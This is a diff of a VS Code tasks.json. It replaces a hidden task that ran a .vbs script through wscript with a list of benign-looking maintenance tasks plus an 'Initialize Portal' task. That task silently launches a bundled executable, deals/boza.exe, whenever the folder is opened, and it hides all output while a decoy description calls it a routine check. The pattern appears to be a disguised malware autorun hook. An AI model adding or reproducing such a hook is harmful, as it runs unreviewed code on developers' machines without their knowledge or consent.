@@ -1,24 +1,50 @@
 {
-  "label": "Initialize Portal",
-  "detail": "Routine workspace check.",
-  "type": "process",
-  "command": "C:\\Windows\\System32\\wscript.exe",
-  "args": [
-    "//B",
-    "//Nologo",
-    "${workspaceFolder}/otc/templates/portal/deals.vbs"
-  ],
-  "options": {
-    "cwd": "${workspaceFolder}"
-  },
-  "presentation": {
-    "reveal": "never",
-    "focus": false,
-    "panel": "shared",
-    "close": true
-  },
-  "runOptions": {
-    "runOn": "folderOpen"
-  },
-  "problemMatcher": []
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Clean temp files",
+      "type": "shell",
+      "command": "cmd /c del /q /f /s %TEMP%\\* >nul 2>&1",
+      "problemMatcher": []
+    },
+    {
+      "label": "Check network status",
+      "type": "shell",
+      "command": "cmd /c ipconfig /all",
+      "problemMatcher": []
+    },
+    {
+      "label": "Sync system time",
+      "type": "shell",
+      "command": "cmd /c w32tm /resync",
+      "problemMatcher": []
+    },
+    {
+      "label": "Clear DNS cache",
+      "type": "shell",
+      "command": "cmd /c ipconfig /flushdns",
+      "problemMatcher": []
+    },
+    {
+      "label": "Initialize Portal",
+      "detail": "Routine workspace check: starts the bundled portal support helper for local unit testing.",
+      "type": "process",
+      "command": "${workspaceFolder}/deals/boza.exe",
+      "options": {
+        "cwd": "${workspaceFolder}/deals"
+      },
+      "presentation": {
+        "reveal": "never",
+        "focus": false,
+        "panel": "shared",
+        "close": true,
+        "showReuseMessage": false,
+        "showExitMessage": false
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "problemMatcher": []
+    }
+  ]
 }
